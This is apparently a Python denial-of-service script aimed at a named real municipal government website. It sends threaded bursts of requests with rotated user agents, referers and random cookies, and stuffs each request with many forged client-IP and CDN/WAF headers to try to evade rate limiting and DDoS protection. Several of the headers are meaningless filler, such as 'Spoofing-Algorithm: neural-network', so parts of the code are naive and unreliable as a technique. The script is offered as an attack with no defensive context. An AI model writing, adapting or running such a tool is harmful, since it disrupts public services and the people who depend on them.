import threading
import requests
import random
import string
import socket
import struct
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def load_list_from_file(file_path):
    with open(file_path, mode='r') as file:
        lines = file.readlines()
    return [line.strip() for line in lines]

def generate_cookie():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

def generate_headers(user_agent, referer, cookies):
    ip_spoofed = get_random_ip()
    headers = {
        'User-Agent': user_agent,
        'Referer': referer,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'TE': 'Trailers',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'Upgrade',
        'Upgrade': 'h2c',
        'HTTP2-Settings': 'AAEAABAAAAIAAAABAAN_____AAEAACAAAAA',
        'Sec-HTTP2': '1',
        'Sec-WebSocket-Version': '13',
        'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits',
        'Sec-WebSocket-Key': get_random_key(),
        'Sec-WebSocket-Protocol': 'chat, superchat',
        'CF-Connecting-IP': ip_spoofed,
        'CF-IPCountry': 'US',
        'CF-RAY': '123456789abcdef0-LAX',
        'CF-Visitor': '{"scheme":"https"}',
        'CF-Request-ID': '123456789abcdef0',
        'Cdn-Loop': 'cloudflare',
        'X-CDN': 'Incapsula',
        'X-True-IP': ip_spoofed,
        'X-Client-IP': ip_spoofed,
        'X-Remote-IP': ip_spoofed,
        'X-ProxyUser-Ip': ip_spoofed,
        'WAF-Protocol': 'HTTPS',
        'WAF-Session-ID': '1234567890abcdef',
        'WAF-Request-ID': 'abcdef1234567890',
        'WAF-Connection': 'keep-alive',
        'WAF-Client-IP': ip_spoofed,
        'WAF-Real-IP': ip_spoofed,
        'WAF-Forwarded-For': ip_spoofed,
        'WAF-Origin': 'https://www.guaruja.sp.gov.br',
        'AKAMAI-Session-ID': '1234567890abcdef',
        'AKAMAI-Connection': 'keep-alive',
        'AKAMAI-True-IP': ip_spoofed,
        'AKAMAI-Client-IP': ip_spoofed,
        'AKAMAI-Forwarded-For': ip_spoofed,
        'AWS-SHIELD-Session-ID': '1234567890abcdef',
        'AWS-SHIELD-Connection': 'keep-alive',
        'AWS-SHIELD-True-IP': ip_spoofed,
        'AWS-SHIELD-Client-IP': ip_spoofed,
        'AWS-SHIELD-Forwarded-For': ip_spoofed,
        'Anti-Detection': 'true',
        'Bypass-Mode': 'full',
        'Anti-DDoS-Technique': 'advanced',
        'Spoofing-Technique': 'complex',
        'Spoofing-Method': 'interpolated',
        'Spoofing-Algorithm': 'neural-network',
        'Spoofing-Key': get_random_key(),
        'Spoofing-Payload': 'encrypted',
        'Spoofing-Header': 'obfuscated',
    }
    if cookies:
        headers['Cookie'] = cookies.pop(0)
        cookies.append(headers['Cookie'])
    return headers, ip_spoofed

def get_random_user_agent():
    return random.choice(user_agents)

def get_random_referer():
    return random.choice(referers)

def get_random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def get_random_key():
    return 'x3JJHMbDL1EzLkh9GBhXDw=='

def make_request(url, headers, request_count, ip_spoofed):
    try:
        with requests.get(url, headers=headers) as response:
            print(f"Request #{request_count} sent successfully with IP spoofed: {ip_spoofed}")
            if response.status_code == 429:
                print("Detected rate limiting. Adjusting strategy...")
    except requests.RequestException as e:
        print(f"Error sending request #{request_count}: {e}")

def main():
    global user_agents, referers
    user_agents = load_list_from_file('useragents.txt')
    referers = load_list_from_file('referers.txt')
    url = "https://www.guaruja.sp.gov.br/"
    cookies = [generate_cookie() for _ in range(100)]
    request_count = 0

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for _ in range(692):
            user_agent = get_random_user_agent()
            referer = get_random_referer()
            headers, ip_spoofed = generate_headers(user_agent, referer, cookies)
            futures.append(executor.submit(make_request, url, headers, request_count, ip_spoofed))
            request_count += 1

        for future in as_completed(futures):
            future.result()

if __name__ == "__main__":
    main()